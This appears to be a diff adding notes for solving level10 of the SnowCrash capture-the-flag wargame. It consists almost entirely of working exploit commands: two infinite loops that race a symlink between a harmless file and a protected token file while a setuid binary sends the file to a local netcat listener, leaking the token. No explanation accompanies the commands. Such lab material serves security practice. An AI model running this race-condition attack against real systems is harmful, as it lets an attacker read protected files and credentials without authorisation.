@@ -1,0 +1,6 @@
+level10@SnowCrash:~$ strings ./level10 | grep 'Connecting'
+while true; do ln -fs ~/level10 /tmp/exploit; ln -fs ~/token /tmp/exploit; done
+while true; do ./level10 /tmp/exploit 127.0.0.1; done
+nc -l 6969
+cat /tmp/exploit
+# do it 3 different windows
